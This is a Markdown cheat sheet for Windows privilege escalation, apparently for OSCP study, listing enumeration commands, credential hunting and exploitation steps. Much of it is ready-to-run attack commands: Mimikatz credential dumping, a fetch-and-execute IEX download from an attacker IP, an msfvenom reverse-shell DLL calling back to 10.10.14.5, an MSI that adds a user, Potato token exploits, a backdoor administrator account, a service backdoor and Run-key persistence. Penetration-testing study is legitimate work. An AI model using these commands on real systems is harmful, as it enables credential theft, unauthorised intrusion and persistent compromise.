# Automated Enumeration

## PrivescCheck (Source)
```
https://github.com/itm4n/PrivescCheck
```
Supposedly cleaner output than WinPEAS

## WinPEAS
```
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```
Fundamental for OSCP. Always run and read output thoroughly.

## PowerShell Tee 
Useful for running WinPEAS -- writes output to file while allowing real-time review.
```powershell
| Tee-Object -FilePath "output.txt"
```
# Helpers
Somewhere in between manual and automated tooling.
## PowerUp.ps1
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

## PowerUp AllChecks
```powershell
Invoke-AllChecks
```

# Manual Context Gathering

## Display current user and all privileges
```cmd
whoami /all
```

## List all local users
```cmd
net user 
```

## Get details for specific user
```powershell
net user administrator
```

## List all local groups
``` cmd
net localgroup
```
## List all local groups
```powershell
Get-LocalGroup
```

## List members of Administrators group
```cmd
net localgroup Administrators
```
## List members of Administrators group
```powershell
Get-LocalGroupMember Administrators
```

## Display system information
```powershell
systeminfo
```

## Display network configuration
```powershell
ipconfig /all
```

## Show routing table
```powershell
route print
```

## List active network connections
```powershell
netstat -ano
```

## Check C:\
Look for unusual folders under C:\ and C:\Temp.

## List installed programs from 32-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List installed programs from 64-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List all running processes
```powershell
Get-Process
```

## List all running processes
```cmd
tasklist /v
```

## List processes with command line arguments
```powershell
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine
wmic process get name,processid,commandline
```

# Credential Hunting

## LaZagne
Automated tool for finding insecurely cached credentials.
```
https://github.com/AlessandroZ/LaZagne
```

## PowerShell Get-ChildItem Credential Hunting
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
```

## Get PowerShell command history
```powershell
Get-History
```

## Get PSReadline history file path
```powershell
(Get-PSReadlineOption).HistorySavePath
```

## Find PSReadline history for all users
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
```
## Check for auto-login credentials in registry
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
## Search for VNC passwords in registry
```cmd
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server
```

## List saved credentials
```cmd
cmdkey /list
```

# Credential Harvesting (Requires local admin)
## Run Mimikatz to extract logon passwords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## Run Mimikatz to extract WDigest credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

## Run Mimikatz to extract MSV credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
```

## Run Mimikatz to dump cached credentials
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

## Run Mimikatz to dump SAM hashes
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

## Run Invoke-Mimikatz PowerShell version
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

# Service Enumeration
## List all services
```powershell
Get-Service
```

## List all services
```cmd
sc query state=all
```

## List services with full path
```powershell
Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,displayname,pathname,startmode
```

## Find unquoted service paths with spaces
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Find unquoted service paths 
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
```

## Find unquoted services with PowerUp
```powershell
Get-UnquotedService
```

## Find modifiable service binaries with PowerUp
```
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

## PowerUp Write-ServiceBinary
```
Write-ServiceBinary
```

Start/stop a service, foo, to replace its binary with a malicious one
`net stop foo`
`net start foo`

# DLL Hijacking
## Create malicious DLL with msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
```

# Scheduled Tasks
## List all scheduled tasks
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

## Find writable scheduled task binaries
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Check for AlwaysInstallElevated registry keys
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Create MSI payload for AlwaysInstallElevated
```bash
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
```

## Install MSI silently
```cmd
msiexec /quiet /qn /i evil.msi
```

## Check registry autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Check startup folder permissions
```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```


# User Account Privileges
- SeImpersonatePrivilege or SeAssignPrimaryToken
	- If we have either of these privileges, refer to the Potato exploit series: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
	- Try Sweet Potato first (stabler than GodPotato)

## SweetPotato (Source)
```
https://github.com/CCob/SweetPotato
```

## Run SweetPotato for privilege escalation
```cmd
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
```


## PrintSpoofer (Source)
```
https://github.com/itm4n/PrintSpoofer
```

## Run PrintSpoofer for Windows Server 2016/2019
```cmd
.\PrintSpoofer64.exe -i -c "whoami"
```

## Run JuicyPotato for older Windows versions
```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *
```

## Create new local administrator
```cmd
net user Administrator2 Password123! /add
net localgroup administrators Administrator2 /add
```

## Create service backdoor
```cmd
sc create evil binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc start evil
```

## Add registry persistence
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\temp\backdoor.exe"
```

---

## Methodology

### Enumeration Priority
1. Run automated tools first (WinPEAS, PowerUp)
2. Check current user privileges (whoami /priv)
3. Look for SeImpersonatePrivilege or SeAssignPrimaryToken
4. Enumerate services for weak permissions
5. Search for credentials in files and registry
6. Check for unquoted service paths
7. Look for AlwaysInstallElevated registry keys

### High Priority Privilege Escalation Vectors

**Immediate Win (Check First):**
- SeImpersonatePrivilege enabled (use SweetPotato/PrintSpoofer)
- SeAssignPrimaryToken enabled (use SweetPotato/PrintSpoofer)
- SeBackupPrivilege enabled
- SeLoadDriver enabled
- SeDebug enabled
- AlwaysInstallElevated registry keys set

**Common Service Exploits:**
- Unquoted service paths with write permissions
- Service binary writable by current user
- Service running as SYSTEM with weak permissions
- DLL hijacking opportunities

**Credential Hunting:**
- PowerShell history files
- Registry credentials (VNC, auto-login)
- Configuration files with passwords
- Saved credentials (cmdkey /list)
- https://github.com/AlessandroZ/LaZagne/releases

**Other Vectors:**
- Writable scheduled tasks running as SYSTEM
- Registry autoruns with write access
- Group Policy Preferences passwords

### Token Impersonation Tools

**SweetPotato (Recommended - Most Compatible):**
- Works on Windows 7 through Windows 11
- Works on Server 2008 through Server 2022
- Most reliable for OSCP

**PrintSpoofer (Windows Server 2016/2019):**
- More stable on newer Windows Server versions
- Requires Print Spooler service running

**JuicyPotato (Older Windows):**
- Works on Windows 7, 8, Server 2008, Server 2012
- Requires specific CLSID for OS version

### Windows Privilege Escalation Checklist

**Phase 1 - Automated Enumeration:**
- Run WinPEAS
- Run PowerUp.ps1
- Run Windows Exploit Suggester (on Kali)

**Phase 2 - Token/Privilege Checks:**
- Check whoami /priv for dangerous privileges
- If SeImpersonatePrivilege: Use SweetPotato
- If SeBackupPrivilege: Backup SAM/SYSTEM hives

**Phase 3 - Service Enumeration:**
- Check for unquoted service paths
- Check service binary permissions
- Check for weak service permissions

**Phase 4 - Credential Hunting:**
- Search PowerShell history
- Search registry for credentials
- Search filesystem for config files
- Check for saved credentials

**Phase 5 - Last Resort:**
- Check for kernel exploits (risky)
- Look for DLL hijacking opportunities

### Common Privilege Groups

**High Value Groups:**
- Administrators (full system access)
- Backup Operators (can backup/restore files)
- Remote Desktop Users (RDP access)
- Remote Management Users (WinRM access)

### Kernel Exploits (Last Resort)

Only use kernel exploits as a last resort due to system crash risk:
- MS16-032 (Secondary Logon Handle)
- MS17-010 (EternalBlue)
- CVE-2020-0796 (SMBGhost)
- CVE-2021-1675 (PrintNightmare)

Always check systeminfo output against Windows Exploit Suggester.

### PowerShell Execution Policy Bypass

If PowerShell execution is restricted:
```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
```

### Useful PowerShell Tools

**PowerUp.ps1** - Privilege escalation enumeration
**Sherlock.ps1** - Exploit suggester
**Invoke-Mimikatz.ps1** - Credential dumping

### Resources
- PowerSploit Framework: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng WinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings Windows: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS Project: https://lolbas-project.github.io/
- OSCP Secret Sauce (SweetPotato, Mimikatz): https://eins.li/posts/oscp-secret-sauce/
